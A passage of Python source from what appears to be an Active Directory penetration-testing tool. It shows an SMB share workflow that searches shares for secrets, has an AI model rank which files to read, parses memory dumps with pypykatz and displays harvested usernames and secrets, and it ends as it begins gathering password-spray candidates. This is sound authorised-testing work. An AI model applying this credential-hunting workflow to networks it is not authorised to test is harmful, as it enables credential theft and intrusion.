            aggregate_map_path=aggregate_map_abs,
            requested_hosts=hosts,
            requested_shares=shares,
            host_share_permissions=share_map,
        )
        host_json_count = int(summary.get("host_json_files", 0))
        merged_files = int(summary.get("merged_file_entries", 0))
        mapped_shares = int(mapping_result.get("mapped_shares", 0))
        partial_targets = int(mapping_result.get("partial_targets", 0))
        failed_targets = int(mapping_result.get("failed_targets", 0))

        if host_json_count == 0:
            print_warning(
                "rclone mapping found no host metadata files to consolidate. "
                "Verify SMB permissions and target paths."
            )
        else:
            print_success(
                f"rclone share mapping updated with {host_json_count} host file(s), "
                f"{mapped_shares} mapped share(s), and {merged_files} file metadata entries."
            )
        if partial_targets > 0:
            print_warning_debug(
                "rclone mapping accepted partial targets with non-zero exit code: "
                f"partial_targets={partial_targets} total_targets={len(target_pairs)}"
            )
        if failed_targets > 0:
            print_warning_debug(
                "rclone mapping targets failed: "
                f"failed_targets={failed_targets} total_targets={len(target_pairs)}"
            )
        print_info(f"Consolidated SMB share tree map saved to {marked_aggregate_rel}.")
        if run_post_mapping_workflow:
            _run_post_mapping_sensitive_data_workflow(
                shell,
                domain=domain,
                aggregate_map_abs=aggregate_map_abs,
                aggregate_map_rel=aggregate_map_rel,
                shares=shares,
                hosts=hosts,
                triage_username=username,
                triage_password=password,
                selected_method=selected_method,
            )
        return True
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        print_error("Error while executing rclone SMB share mapping.")
        print_exception(show_locals=False, exception=exc)
        print_error_debug(traceback.format_exc())
        return False


def _run_post_mapping_sensitive_data_workflow(
    shell: Any,
    *,
    domain: str,
    aggregate_map_abs: str,
    aggregate_map_rel: str,
    shares: list[str],
    hosts: list[str],
    triage_username: str | None = None,
    triage_password: str | None = None,
    selected_method: str | None = None,
    cifs_mount_root: str | None = None,
) -> None:
    """Run post-mapping sensitive-data search using deterministic and/or AI flow."""
    from adscan_internal.services.ai_backend_availability_service import (
        AIBackendAvailabilityService,
    )

    availability = AIBackendAvailabilityService().get_availability()
    hosts_count = len(hosts)
    shares_count = len(shares)
    print_info_debug(
        "Post-mapping AI availability: "
        f"configured={availability.configured} enabled={availability.enabled} "
        f"provider={availability.provider} reason={availability.reason}"
    )

    if selected_method is None:
        selected_method = _select_post_mapping_sensitive_data_method(
            shell=shell,
            ai_configured=availability.configured,
        )
    _capture_post_mapping_sensitive_data_telemetry(
        shell=shell,
        stage="selected",
        method=(selected_method or "skip"),
        outcome="method_selected" if selected_method else "skipped_by_user",
        ai_configured=availability.configured,
        ai_provider=availability.provider,
        ai_reason=availability.reason,
        hosts_count=hosts_count,
        shares_count=shares_count,
    )
    if selected_method is None:
        print_info("Post-mapping sensitive-data analysis skipped by user.")
        return

    if selected_method not in {"deterministic", "ai", "ai_cifs", "ai_rclone"}:
        marked_method = mark_sensitive(selected_method, "text")
        print_warning(
            f"Unsupported sensitive-data analysis method selected: {marked_method}."
        )
        return

    marked_method = mark_sensitive(selected_method, "text")
    print_info_debug(f"Post-mapping sensitive-data method selected: {marked_method}")
    deterministic_executed = False
    ai_attempted = False
    ai_success: bool | None = None
    fallback_used = False

    if selected_method == "deterministic":
        deterministic_executed = True
        _run_post_mapping_deterministic_share_scan(
            shell=shell,
            domain=domain,
            shares=shares,
            hosts=hosts,
            username=triage_username or "",
            password=triage_password or "",
        )
    if selected_method in {"ai", "ai_cifs", "ai_rclone"}:
        ai_attempted = True
        read_backend = (
            "cifs_local" if selected_method == "ai_cifs" else "smb_impacket"
        )
        try:
            ai_ok = _run_post_mapping_ai_triage(
                shell,
                domain=domain,
                aggregate_map_abs=aggregate_map_abs,
                aggregate_map_rel=aggregate_map_rel,
                triage_username=triage_username,
                triage_password=triage_password,
                read_backend=read_backend,
                cifs_mount_root=cifs_mount_root,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            ai_ok = False
            print_warning(
                "AI post-mapping analysis failed due to an unexpected error."
            )
            print_warning_debug(
                "AI post-mapping analysis exception: "
                f"{type(exc).__name__}: {exc}"
            )
            print_warning_debug(traceback.format_exc())
        ai_success = ai_ok

        if selected_method in {"ai", "ai_cifs", "ai_rclone"} and not ai_ok:
            fallback_used = True
            print_warning(
                "AI analysis did not complete successfully. "
                "Falling back to deterministic share analysis."
            )
            deterministic_executed = True
            _run_post_mapping_deterministic_share_scan(
                shell=shell,
                domain=domain,
                shares=shares,
                hosts=hosts,
                username=triage_username or "",
                password=triage_password or "",
            )

    if selected_method == "deterministic":
        outcome = "deterministic_completed"
    elif selected_method == "ai_cifs":
        outcome = (
            "ai_cifs_completed"
            if ai_success
            else "ai_cifs_failed_fallback_deterministic_attempted"
        )
    elif selected_method == "ai":
        outcome = (
            "ai_completed"
            if ai_success
            else "ai_failed_fallback_deterministic_attempted"
        )
    elif selected_method == "ai_rclone":
        outcome = (
            "ai_rclone_completed"
            if ai_success
            else "ai_rclone_failed_fallback_deterministic_attempted"
        )
    else:
        outcome = "unknown"

    _capture_post_mapping_sensitive_data_telemetry(
        shell=shell,
        stage="completed",
        method=selected_method,
        outcome=outcome,
        ai_configured=availability.configured,
        ai_provider=availability.provider,
        ai_reason=availability.reason,
        hosts_count=hosts_count,
        shares_count=shares_count,
        deterministic_executed=deterministic_executed,
        ai_attempted=ai_attempted,
        ai_success=ai_success,
        fallback_used=fallback_used,
    )


def _capture_post_mapping_sensitive_data_telemetry(
    *,
    shell: Any,
    stage: str,
    method: str,
    outcome: str,
    ai_configured: bool,
    ai_provider: str,
    ai_reason: str,
    hosts_count: int,
    shares_count: int,
    deterministic_executed: bool = False,
    ai_attempted: bool = False,
    ai_success: bool | None = None,
    fallback_used: bool = False,
) -> None:
    """Capture telemetry event for post-mapping sensitive-data workflow."""
    properties: dict[str, Any] = {
        "stage": stage,
        "method": method,
        "outcome": outcome,
        "ai_configured": ai_configured,
        "ai_provider": ai_provider,
        "ai_reason": ai_reason,
        "hosts_count": hosts_count,
        "shares_count": shares_count,
        "deterministic_executed": deterministic_executed,
        "ai_attempted": ai_attempted,
        "fallback_used": fallback_used,
        "auto_mode": bool(getattr(shell, "auto", False)),
        "workspace_type": str(getattr(shell, "type", "") or "").strip().lower()
        or "unknown",
    }
    if ai_success is not None:
        properties["ai_success"] = ai_success
    telemetry.capture("smb_sensitive_data_analysis", properties)


def _run_post_mapping_deterministic_share_scan(
    shell: Any,
    *,
    domain: str,
    shares: list[str],
    hosts: list[str],
    username: str,
    password: str,
) -> None:
    """Run deterministic share secret search via manspider + credsweeper."""
    manspider_passw = getattr(shell, "manspider_passw", None)
    if not callable(manspider_passw):
        print_warning(
            "Deterministic SMB share search is unavailable: "
            "shell.manspider_passw is not callable."
        )
        return

    marked_domain = mark_sensitive(domain, "domain")
    marked_user = mark_sensitive(username or "unknown", "user")
    print_info(
        "Running deterministic share analysis (manspider + credsweeper) "
        f"for domain {marked_domain} as {marked_user}."
    )
    manspider_passw(domain, username, password, shares, hosts)


def _select_post_mapping_sensitive_data_method(
    *,
    shell: Any,
    ai_configured: bool,
) -> str | None:
    """Select sensitive-data analysis mode for SMB share workflows.

    UX is intentionally two-step when AI is available:
    1) Choose analysis mode (deterministic or AI).
    2) If AI selected, choose mapping backend (spider_plus, CIFS, rclone).
    """
    if getattr(shell, "auto", False):
        return "deterministic"

    if not ai_configured:
        print_info_debug(
            "AI method selector skipped: no configured AI backend detected."
        )
        return "deterministic"

    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        return "deterministic"

    primary_options = [
        "Deterministic only (manspider + credsweeper) [Recommended]",
        "AI-assisted share analysis",
        "Skip sensitive-data analysis",
    ]
    primary_idx = selector(
        "Select SMB sensitive-data analysis mode:",
        primary_options,
        default_idx=0,
    )
    if primary_idx == 0:
        return "deterministic"
    if primary_idx == 2:
        return None
    if primary_idx != 1:
        return "deterministic"

    mapping_options = [
        "spider_plus (NetExec) [Recommended]",
        "CIFS mounted shares",
        "rclone SMB mapping",
        "Back",
    ]
    mapping_idx = selector(
        "Select AI share mapping backend:",
        mapping_options,
        default_idx=0,
    )
    if mapping_idx == 0:
        return "ai"
    if mapping_idx == 1:
        return "ai_cifs"
    if mapping_idx == 2:
        return "ai_rclone"
    if mapping_idx == 3:
        return "deterministic"
    return "deterministic"


def _run_post_mapping_ai_triage(
    shell: Any,
    *,
    domain: str,
    aggregate_map_abs: str,
    aggregate_map_rel: str,
    triage_username: str | None = None,
    triage_password: str | None = None,
    read_backend: str = "smb_impacket",
    cifs_mount_root: str | None = None,
) -> bool:
    """Run AI triage on consolidated share mapping JSON after spider_plus."""
    from adscan_internal.services.share_map_ai_triage_service import (
        ShareMapAITriageService,
    )

    ai_service = shell._get_ai_service()
    if ai_service is None:
        print_info_debug("AI triage skipped: AI service is unavailable.")
        return False

    scope = _select_post_mapping_ai_scope(shell)
    if scope is None:
        print_info("AI triage skipped by user.")
        return True

    triage_service = ShareMapAITriageService()
    try:
        mapping_json = triage_service.load_full_mapping_json(
            aggregate_map_path=aggregate_map_abs
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        marked_map = mark_sensitive(aggregate_map_rel, "path")
        print_warning(
            f"AI triage skipped: could not load consolidated mapping from {marked_map}."
        )
        print_warning_debug(f"AI triage map load failure: {type(exc).__name__}: {exc}")
        return False

    active_username = ""
    if (
        hasattr(shell, "domains_data")
        and isinstance(getattr(shell, "domains_data", None), dict)
    ):
        domain_data = shell.domains_data.get(domain, {})
        if isinstance(domain_data, dict):
            active_username = str(domain_data.get("username", "")).strip()

    effective_username = str(triage_username or "").strip() or active_username
    effective_password = str(triage_password or "").strip()
    principal_key, allowed_share_pairs = triage_service.resolve_principal_allowed_shares(
        mapping_json=mapping_json,
        domain=domain,
        username=effective_username,
    )
    if principal_key and allowed_share_pairs:
        total_before_scope = triage_service.count_total_file_entries(
            mapping_json=mapping_json
        )
        scoped_mapping_json = triage_service.filter_mapping_json_by_allowed_shares(
            mapping_json=mapping_json,
            allowed_share_pairs=allowed_share_pairs,
        )
        total_after_scope = triage_service.count_total_file_entries(
            mapping_json=scoped_mapping_json
        )
        mapping_json = scoped_mapping_json
        marked_principal = mark_sensitive(principal_key, "user")
        print_info_debug(
            "AI triage principal scope applied: "
            f"principal={marked_principal} "
            f"allowed_host_shares={len(allowed_share_pairs)} "
            f"files_before={total_before_scope} files_after={total_after_scope}"
        )
    elif principal_key:
        marked_principal = mark_sensitive(principal_key, "user")
        print_info_debug(
            "AI triage principal scope resolved but no READ share permissions found: "
            f"principal={marked_principal}"
        )
    elif effective_username:
        requested_principal = mark_sensitive(f"{domain}\\{effective_username}", "user")
        print_info_debug(
            "AI triage principal scope not found in share map; using full mapping: "
            f"principal={requested_principal}"
        )

    if effective_username and effective_password:
        marked_user = mark_sensitive(effective_username, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "AI triage byte-read auth source: "
            f"user={marked_user} domain={marked_domain} source=spider_plus_run"
        )
    elif active_username:
        marked_user = mark_sensitive(active_username, "user")
        marked_domain = mark_sensitive(domain, "domain")
        print_info_debug(
            "AI triage byte-read auth source: "
            f"user={marked_user} domain={marked_domain} source=active_domain_context"
        )
    if read_backend == "cifs_local":
        resolved_root = str(cifs_mount_root or "").strip() or _resolve_cifs_mount_root(
            shell=shell,
            domain=domain,
        )
        marked_root = mark_sensitive(resolved_root, "path")
        print_info_debug(
            "AI triage read backend selected: backend=cifs_local "
            f"mount_root={marked_root}"
        )

    print_info_debug(
        "AI triage share-map context loaded: "
        f"scope={scope} chars={len(mapping_json)}"
    )
    prompt = triage_service.build_triage_prompt(
        domain=domain,
        search_scope=scope,
        mapping_json=mapping_json,
    )
    print_info("Running AI triage on consolidated SMB share mapping...")
    response = ai_service.ask_once(prompt, allow_cli_actions=False)
    metadata = getattr(ai_service, "last_response_metadata", {}) or {}
    prompt_est_tokens = metadata.get("request_prompt_estimated_tokens")
    if isinstance(prompt_est_tokens, int):
        print_info_debug(
            f"AI triage prompt estimated tokens={prompt_est_tokens} for scope={scope}."
        )
        if prompt_est_tokens >= 70000:
            print_warning(
                "AI triage context is very large and model output quality may degrade "
                "(for example, malformed or empty JSON responses)."
            )
    total_files = triage_service.count_total_file_entries(mapping_json=mapping_json)
    size_index = triage_service.build_file_size_index(mapping_json=mapping_json)
    triage_parse = triage_service.parse_triage_response(
        response_text=response
    )
    prioritized_files = triage_parse.prioritized_files
    if allowed_share_pairs:
        before_count = len(prioritized_files)
        prioritized_files = triage_service.filter_priority_files_by_allowed_shares(
            prioritized_files=prioritized_files,
            allowed_share_pairs=allowed_share_pairs,
        )
        dropped = before_count - len(prioritized_files)
        if dropped > 0:
            print_info_debug(
                "AI prioritized files filtered by principal share permissions: "
                f"dropped={dropped} kept={len(prioritized_files)}"
            )
    _render_ai_triage_prioritization_summary(
        shell,
        prioritized_files=prioritized_files,
        total_files=total_files,
    )

    if not prioritized_files:
        print_warning(
            "AI triage did not return a valid priority_files list. "
            "Skipping per-file analysis."
        )
        print_info_debug(
            "AI triage parse diagnostics: "
            f"status={triage_parse.parse_status} "
            f"payload_present={triage_parse.payload_present} "
            f"raw_priority_items={triage_parse.raw_priority_items} "
            f"valid_priority_items={triage_parse.valid_priority_items}"
        )
        if triage_parse.stop_reason:
            marked_stop_reason = mark_sensitive(triage_parse.stop_reason, "text")
            print_info_debug(f"AI triage stop_reason: {marked_stop_reason}")
        for note in triage_parse.notes:
            marked_note = mark_sensitive(note, "text")
            print_info_debug(f"AI triage note: {marked_note}")
        response_preview = (response or "").strip()
        if response_preview:
            marked_preview = mark_sensitive(response_preview[:1200], "text")
            print_info_debug(
                "AI triage raw response preview (first 1200 chars): "
                f"{marked_preview}"
            )
        print_info_debug(
            f"AI triage raw response size: chars={len(response or '')}"
        )
        return False

    read_mode_label = (
        "local CIFS reads"
        if read_backend == "cifs_local"
        else "Impacket byte-stream reads"
    )
    if not Confirm.ask(
        f"Do you want AI to inspect these prioritized files using {read_mode_label}?",
        default=True,
    ):
        print_info("AI prioritized file inspection cancelled by user.")
        return True

    _run_ai_prioritized_file_analysis(
        shell,
        domain=domain,
        scope=scope,
        triage_service=triage_service,
        ai_service=ai_service,
        prioritized_files=prioritized_files,
        size_index=size_index,
        read_username=effective_username or None,
        read_password=effective_password or None,
        read_domain=domain if effective_username and effective_password else None,
        read_backend=read_backend,
        cifs_mount_root=cifs_mount_root,
    )
    return True


def _render_ai_triage_prioritization_summary(
    shell: Any,
    *,
    prioritized_files: list[Any],
    total_files: int,
) -> None:
    """Render AI prioritization summary after share-map triage."""
    selected = len(prioritized_files)
    print_info(
        f"AI triage selected {selected} prioritized file(s) out of {total_files} "
        "total mapped file(s)."
    )
    if not prioritized_files:
        return

    table = Table(
        title="[bold cyan]AI Prioritized SMB Files[/bold cyan]",
        header_style="bold magenta",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("#", style="cyan", justify="right")
    table.add_column("Host", style="cyan")
    table.add_column("Share", style="magenta")
    table.add_column("Path", style="yellow")
    table.add_column("Why", style="green")

    for idx, candidate in enumerate(prioritized_files, start=1):
        host = mark_sensitive(str(getattr(candidate, "host", "")), "hostname")
        share = mark_sensitive(str(getattr(candidate, "share", "")), "service")
        path = mark_sensitive(str(getattr(candidate, "path", "")), "path")
        why = str(getattr(candidate, "why", "") or "").strip()
        if len(why) > 120:
            why = why[:117] + "..."
        table.add_row(str(idx), host, share, path, why or "-")

    print_panel_with_table(table, border_style=BRAND_COLORS["info"])


def _run_ai_prioritized_file_analysis(
    shell: Any,
    *,
    domain: str,
    scope: str,
    triage_service: Any,
    ai_service: Any,
    prioritized_files: list[Any],
    size_index: dict[tuple[str, str, str], Any],
    read_username: str | None = None,
    read_password: str | None = None,
    read_domain: str | None = None,
    read_backend: str = "smb_impacket",
    cifs_mount_root: str | None = None,
) -> None:
    """Analyze prioritized SMB files with AI using configured file-read backend."""
    from adscan_internal.services.cifs_share_mapping_service import (
        CIFSShareMappingService,
    )
    from adscan_internal.services.file_byte_reader_service import (
        LocalFileByteReaderService,
        SMBFileByteReaderService,
    )
    from adscan_internal.services.share_file_analysis_pipeline_service import (
        ShareFileAnalysisPipelineService,
    )
    from adscan_internal.services.share_file_analyzer_service import (
        ShareFileAnalyzerService,
    )
    from adscan_internal.services.share_file_content_extraction_service import (
        ShareFileContentExtractionService,
    )
    from adscan_internal.services.share_credential_provenance_service import (
        ShareCredentialProvenanceService,
    )

    reader_service = SMBFileByteReaderService()
    local_reader_service = LocalFileByteReaderService()
    cifs_mapping_service = CIFSShareMappingService()
    provenance_service = ShareCredentialProvenanceService()
    pipeline_service = ShareFileAnalysisPipelineService(
        analyzer_service=ShareFileAnalyzerService(
            command_executor=getattr(shell, "run_command", None),
            pypykatz_path=getattr(shell, "pypykatz_path", None),
        ),
        extraction_service=ShareFileContentExtractionService(),
    )
    max_bytes = _resolve_ai_file_read_max_bytes()
    read_failures = 0
    analyzed = 0
    deterministic_handled = 0
    deterministic_findings = 0
    flagged_files = 0
    flagged_credentials = 0
    skipped_oversized = 0
    forced_oversized = 0
    oversized_rows: list[tuple[str, str, str, str, str]] = []
    continue_after_findings: bool | None = None
    local_reads = 0
    local_to_smb_fallbacks = 0

    for idx, candidate in enumerate(prioritized_files, start=1):
        host = str(getattr(candidate, "host", "")).strip()
        share = str(getattr(candidate, "share", "")).strip()
        path = str(getattr(candidate, "path", "")).strip()
        is_zip_candidate = _is_zip_path(path)
        if not host or not share or not path:
            read_failures += 1
            print_warning_debug(
                "Skipping invalid prioritized file candidate: "
                f"host={host!r} share={share!r} path={path!r}"
            )
            continue

        size_key = (host.lower(), share.lower(), path.lower())
        size_info = size_index.get(size_key)
        known_size_bytes = getattr(size_info, "size_bytes", None)
        known_size_text = str(getattr(size_info, "size_text", "") or "").strip()
        per_file_max_bytes = max_bytes
        full_zip_limit = _resolve_ai_zip_full_read_max_bytes()
        if isinstance(known_size_bytes, int) and known_size_bytes > max_bytes:
            marked_path = mark_sensitive(path, "path")
            marked_host = mark_sensitive(host, "hostname")
            marked_share = mark_sensitive(share, "service")
            limit_text = _format_size_human(max_bytes)
            file_size_text = known_size_text or f"{known_size_bytes} B"
            print_warning(
                "Prioritized file exceeds configured read limit: "
                f"{marked_host}/{marked_share}:{marked_path} "
                f"(size={file_size_text}, limit={limit_text})."
            )
            analyze_anyway = Confirm.ask(
                (
                    "Analyze this oversized file anyway? "
                    f"(size={file_size_text}, capped_read_limit={limit_text})"
                ),
                default=False,
            )
            print_info_debug(
                "AI oversized file decision: "
                f"host={marked_host} share={marked_share} path={marked_path} "
                f"size={file_size_text} limit={limit_text} "
                f"analyze_anyway={analyze_anyway}"
            )
            if not analyze_anyway:
                skipped_oversized += 1
                oversized_rows.append(
                    (
                        host,
                        share,
                        path,
                        file_size_text,
                        limit_text,
                    )
                )
                continue
            forced_oversized += 1
            if is_zip_candidate:
                file_size_text = known_size_text or f"{known_size_bytes} B"
                full_limit_text = _format_size_human(full_zip_limit)
                if known_size_bytes <= full_zip_limit:
                    read_full_zip = Confirm.ask(
                        (
                            "ZIP archives often fail deterministic parsing when truncated. "
                            "Read full ZIP for deterministic analysis? "
                            f"(size={file_size_text}, safety_limit={full_limit_text})"
                        ),
                        default=True,
                    )
                    print_info_debug(
                        "AI ZIP full-read decision: "
                        f"host={marked_host} share={marked_share} path={marked_path} "
                        f"size={file_size_text} default_limit={limit_text} "
                        f"full_read_limit={full_limit_text} read_full_zip={read_full_zip}"
                    )
                    if read_full_zip:
                        per_file_max_bytes = full_zip_limit
                        print_info_debug(
                            "AI ZIP full-read effective bytes: "
                            f"known_size_bytes={known_size_bytes} "
                            f"requested_max_bytes={per_file_max_bytes}"
                        )
                        print_info(
                            "Continuing with full ZIP read for deterministic analysis on "
                            f"{marked_path} (max read {_format_size_human(per_file_max_bytes)})."
                        )
                    else:
                        print_info(
                            f"Continuing with capped analysis for oversized file {marked_path} "
                            f"(max read {limit_text})."
                        )
                else:
                    print_warning(
                        "ZIP exceeds configured full-read safety limit and will stay capped: "
                        f"{marked_path} (size={file_size_text}, safety_limit={full_limit_text})."
                    )
                    print_info(
                        f"Continuing with capped analysis for oversized file {marked_path} "
                        f"(max read {limit_text})."
                    )
            else:
                print_info(
                    f"Continuing with capped analysis for oversized file {marked_path} "
                    f"(max read {limit_text})."
                )

        marked_host = mark_sensitive(host, "hostname")
        marked_share = mark_sensitive(share, "service")
        marked_path = mark_sensitive(path, "path")
        print_info(
            f"[{idx}/{len(prioritized_files)}] AI reading {marked_path} "
            f"on {marked_host}/{marked_share}"
        )

        per_file_backend = read_backend
        local_source_path = ""
        read_result: Any | None = None
        if read_backend == "cifs_local":
            resolved_mount_root = str(cifs_mount_root or "").strip() or _resolve_cifs_mount_root(
                shell=shell,
                domain=domain,
            )
            local_source_path = (
                cifs_mapping_service.resolve_candidate_local_path(
                    mount_root=resolved_mount_root,
                    host=host,
                    share=share,
                    remote_path=path,
                    allow_share_root_fallback=len(prioritized_files) <= 1,
                )
                or ""
            )
            if local_source_path:
                local_reads += 1
                read_result = local_reader_service.read_file_bytes(
                    source_path=local_source_path,
                    max_bytes=per_file_max_bytes,
                )
            else:
                local_to_smb_fallbacks += 1
                per_file_backend = "smb_impacket"
                marked_root = mark_sensitive(resolved_mount_root, "path")
                print_warning_debug(
                    "CIFS local path resolution failed; falling back to SMB byte-stream: "
                    f"host={marked_host} share={marked_share} path={marked_path} "
                    f"mount_root={marked_root}"
                )
        if per_file_backend != "cifs_local":
            read_result = reader_service.read_file_bytes(
                shell=shell,
                domain=domain,
                host=host,
                share=share,
                source_path=path,
                max_bytes=per_file_max_bytes,
                timeout_seconds=120 if per_file_max_bytes > max_bytes else 30,
                auth_username=read_username,
                auth_password=read_password,
                auth_domain=read_domain,
            )
        if read_result is None:
            continue
        print_info_debug(
            "AI file read result: "
            f"host={marked_host} share={marked_share} path={marked_path} "
            f"backend={per_file_backend} "
            f"requested_max_bytes={per_file_max_bytes} "
            f"received_bytes={len(read_result.data)} "
            f"truncated={read_result.truncated} success={read_result.success}"
        )
        if not read_result.success:
            read_failures += 1
            read_label = (
                "local CIFS read" if per_file_backend == "cifs_local" else "Impacket byte-stream"
            )
            print_warning(
                f"Could not read {marked_path} via {read_label}."
            )
            auth_user_marked = mark_sensitive(
                read_result.auth_username or "unknown",
                "user",
            )
            auth_domain_marked = mark_sensitive(
                read_result.auth_domain or domain,
                "domain",
            )
            normalized_path_marked = mark_sensitive(
                read_result.normalized_path or path,
                "path",
            )
            if per_file_backend == "cifs_local":
                print_warning_debug(
                    "CIFS local read failure: "
                    f"host={marked_host} share={marked_share} path={marked_path} "
                    f"local_path={normalized_path_marked} "
                    f"error={read_result.error_message or 'unknown'}"
                )
            else:
                print_warning_debug(
                    "SMB byte read failure: "
                    f"host={marked_host} share={marked_share} path={marked_path} "
                    f"normalized_path={normalized_path_marked} "
                    f"auth_user={auth_user_marked} auth_domain={auth_domain_marked} "
                    f"auth_mode={read_result.auth_mode or 'unknown'} "
                    f"status={read_result.status_code or '-'} "
                    f"error={read_result.error_message or 'unknown'}"
                )
            continue

        if read_result.truncated:
            print_warning(
                f"File {marked_path} was truncated to "
                f"{_format_size_human(per_file_max_bytes)} for AI analysis."
            )
            if is_zip_candidate:
                print_warning_debug(
                    "Truncated ZIP stream detected: deterministic ZIP->DMP analyzers "
                    "may not execute (pypykatz path likely skipped)."
                )

        pipeline_result = pipeline_service.analyze_from_bytes(
            domain=domain,
            scope=scope,
            candidate=candidate,
            source_path=path,
            file_bytes=read_result.data,
            truncated=read_result.truncated,
            max_bytes=per_file_max_bytes,
            triage_service=triage_service,
            ai_service=ai_service,
        )
        if pipeline_result.deterministic_handled:
            deterministic_handled += 1
            for note in pipeline_result.deterministic_notes:
                print_info_debug(
                    "Deterministic analyzer note for "
                    f"{marked_host}/{marked_share}:{marked_path}: {note}"
                )
            if pipeline_result.deterministic_summary:
                print_info(
                    "Deterministic summary for "
                    f"{marked_path}: {pipeline_result.deterministic_summary}"
                )
            if pipeline_result.deterministic_findings:
                finding_count = len(pipeline_result.deterministic_findings)
                deterministic_findings += finding_count
                flagged_files += 1
                flagged_credentials += finding_count
                _render_file_credentials_table(
                    shell,
                    candidate=candidate,
                    findings=pipeline_result.deterministic_findings,
                    source_label="Deterministic",
                )
                if not _handle_prioritized_findings_actions(
                    shell=shell,
                    domain=domain,
                    candidate=candidate,
                    findings=pipeline_result.deterministic_findings,
                    auth_username=read_username,
                    provenance_service=provenance_service,
                ):
                    continue_after_findings = False
                if continue_after_findings is None:
                    continue_after_findings = _confirm_continue_after_findings(
                        shell=shell,
                    )
                if continue_after_findings is False:
                    print_info(
                        "Stopping prioritized file analysis after credential findings "
                        "by user choice."
                    )
                    break
        if pipeline_result.error_message:
            read_failures += 1
            print_warning(
                f"Could not extract readable content from {marked_path} for AI analysis."
            )
            print_warning_debug(
                "AI extraction failure: "
                f"host={marked_host} share={marked_share} path={marked_path} "
                f"error={pipeline_result.error_message}"
            )
            continue

        if pipeline_result.ai_attempted:
            analyzed += 1
            print_info_debug(
                "AI content extraction completed: "
                f"host={marked_host} share={marked_share} path={marked_path} "
                f"mode={pipeline_result.extraction_mode} "
                f"content_chars={pipeline_result.extraction_chars} "
                f"notes={len(pipeline_result.extraction_notes)}"
            )
            for note in pipeline_result.extraction_notes:
                print_info_debug(
                    "AI extraction note for "
                    f"{marked_host}/{marked_share}:{marked_path}: {note}"
                )
            if pipeline_result.ai_summary:
                print_info(f"AI summary for {marked_path}: {pipeline_result.ai_summary}")

            if pipeline_result.ai_findings:
                flagged_files += 1
                flagged_credentials += len(pipeline_result.ai_findings)
                _render_file_credentials_table(
                    shell,
                    candidate=candidate,
                    findings=pipeline_result.ai_findings,
                    source_label="AI",
                )
                if not _handle_prioritized_findings_actions(
                    shell=shell,
                    domain=domain,
                    candidate=candidate,
                    findings=pipeline_result.ai_findings,
                    auth_username=read_username,
                    provenance_service=provenance_service,
                ):
                    continue_after_findings = False
                if continue_after_findings is None:
                    continue_after_findings = _confirm_continue_after_findings(
                        shell=shell,
                    )
                if continue_after_findings is False:
                    print_info(
                        "Stopping prioritized file analysis after credential findings "
                        "by user choice."
                    )
                    break
            else:
                print_info_debug(
                    "AI file analysis returned no credential-like findings for "
                    f"{host}/{share}:{path}."
                )
        elif not pipeline_result.deterministic_handled:
            read_failures += 1
            print_info_debug(
                "File analysis pipeline produced no deterministic or AI result for "
                f"{host}/{share}:{path}."
            )

    print_panel(
        (
            f"AI prioritized analysis completed.\n"
            f"- read_backend={read_backend}\n"
            f"- prioritized_files={len(prioritized_files)}\n"
            f"- analyzed={analyzed}\n"
            f"- deterministic_handled={deterministic_handled}\n"
            f"- deterministic_findings={deterministic_findings}\n"
            f"- read_failures={read_failures}\n"
            f"- local_reads={local_reads}\n"
            f"- local_to_smb_fallbacks={local_to_smb_fallbacks}\n"
            f"- files_with_findings={flagged_files}\n"
            f"- credential_like_findings={flagged_credentials}\n"
            f"- skipped_oversized={skipped_oversized}\n"
            f"- forced_oversized={forced_oversized}"
        ),
        title="[bold]SMB AI File Analysis[/bold]",
        border_style="cyan",
        padding=(0, 1),
    )
    if oversized_rows:
        _render_ai_oversized_skips_table(rows=oversized_rows)


def _render_file_credentials_table(
    shell: Any,
    *,
    candidate: Any,
    findings: list[Any],
    source_label: str,
) -> None:
    """Render credential-like findings for one SMB file."""
    source = str(source_label or "AI").strip() or "AI"
    table = Table(
        title=f"[bold red]{source} Credential-like Findings[/bold red]",
        header_style="bold red",
        box=rich.box.SIMPLE_HEAVY,
    )
    table.add_column("Type", style="cyan")
    table.add_column("Username", style="magenta")
    table.add_column("Secret", style="green")
    table.add_column("Confidence", style="yellow")
    table.add_column("Evidence", style="white")

    host = mark_sensitive(str(getattr(candidate, "host", "")), "hostname")
    share = mark_sensitive(str(getattr(candidate, "share", "")), "service")
    path = mark_sensitive(str(getattr(candidate, "path", "")), "path")
    print_warning(
        f"{source} flagged potential credential findings in {host}/{share}:{path}"
    )

    for finding in findings:
        cred_type = str(getattr(finding, "credential_type", "") or "").strip() or "-"
        username = mark_sensitive(
            str(getattr(finding, "username", "") or "").strip() or "-",
            "user",
        )
        secret = mark_sensitive(
            str(getattr(finding, "secret", "") or "").strip() or "-",
            "password",
        )
        confidence = str(getattr(finding, "confidence", "") or "").strip() or "-"
        evidence = mark_sensitive(
            str(getattr(finding, "evidence", "") or "").strip() or "-",
            "text",
        )
        if len(evidence) > 140:
            evidence = evidence[:137] + "..."
        table.add_row(cred_type, username, secret, confidence, evidence)

    print_panel_with_table(table, border_style=BRAND_COLORS["warning"])


def _resolve_ai_file_read_max_bytes() -> int:
    """Resolve maximum bytes per remote SMB file read for AI analysis."""
    raw = os.getenv("ADSCAN_AI_SHARE_FILE_MAX_BYTES", "10485760").strip()
    try:
        value = int(raw)
    except ValueError:
        return 10485760
    return max(65536, min(value, 10 * 1024 * 1024))


def _confirm_continue_after_findings(*, shell: Any) -> bool:
    """Ask once whether prioritized analysis should continue after findings."""
    run_type = str(getattr(shell, "type", "") or "").strip().lower()
    default_continue = run_type != "ctf"
    return Confirm.ask(
        "Credential-like findings detected. Continue analyzing remaining prioritized files?",
        default=default_continue,
    )


def _handle_prioritized_findings_actions(
    *,
    shell: Any,
    domain: str,
    candidate: Any,
    findings: list[Any],
    auth_username: str | None = None,
    provenance_service: Any | None = None,
) -> bool:
    """Offer follow-up actions for findings and return True when analysis may continue."""
    if not findings:
        return True

    host = str(getattr(candidate, "host", "") or "").strip()
    share = str(getattr(candidate, "share", "") or "").strip()
    path = str(getattr(candidate, "path", "") or "").strip()

    credential_candidates: list[tuple[str, str, str]] = []
    seen_credential_candidates: set[tuple[str, str]] = set()
    spray_candidates: list[str] = []
